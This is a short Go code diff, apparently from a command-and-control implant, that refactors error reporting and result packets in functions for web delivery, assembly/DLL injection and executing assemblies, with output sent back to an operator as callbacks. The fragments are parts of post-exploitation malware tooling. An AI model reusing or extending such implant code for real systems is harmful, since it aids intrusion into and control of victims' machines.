@@ -28,14 +28,14 @@ func WebDelivery(b []byte) {
 	go func() {
 		l, err := net.Listen("tcp", "127.0.0.1:"+strconv.Itoa(int(serverPort)))
 		if err != nil {
-			ErrorMessage(err.Error())
+			packet.ErrorMessage(err.Error())
 			return
 		}
 		defer l.Close()
 		conn, err := l.Accept()
 		if err != nil {
 			fmt.Println("Error accepting: ", err)
-			ErrorMessage(err.Error())
+			packet.ErrorMessage(err.Error())
 			return
 		}
 		defer conn.Close()
@@ -105,10 +105,9 @@ func execAsmInject(b []byte, isDllX64 bool, ignoreToken bool) error {
 		var bytesRead uint32
 		err = windows.ReadFile(readPipe, buf, &bytesRead, &read)
 		if err != nil {
-			ErrorMessage("error reading result")
+			packet.ErrorMessage("error reading result")
 		}
-		finalPacket := packet.MakePacket(int(callBackType), buf[:bytesRead])
-		packet.PushResult(finalPacket)
+		packet.PushResult(int(callBackType), buf[:bytesRead])
 		windows.CloseHandle(writePipe)
 		windows.CloseHandle(readPipe)
 		return nil
@@ -142,7 +141,6 @@ func execAsmGo(b []byte) error {
 	if stderr != "" {
 		return errors.New(stderr)
 	}
-	finalPacket := packet.MakePacket(int(callBackType), []byte(stdout))
-	packet.PushResult(finalPacket)
+	packet.PushResult(int(callBackType), []byte(stdout))
 	return nil
 }
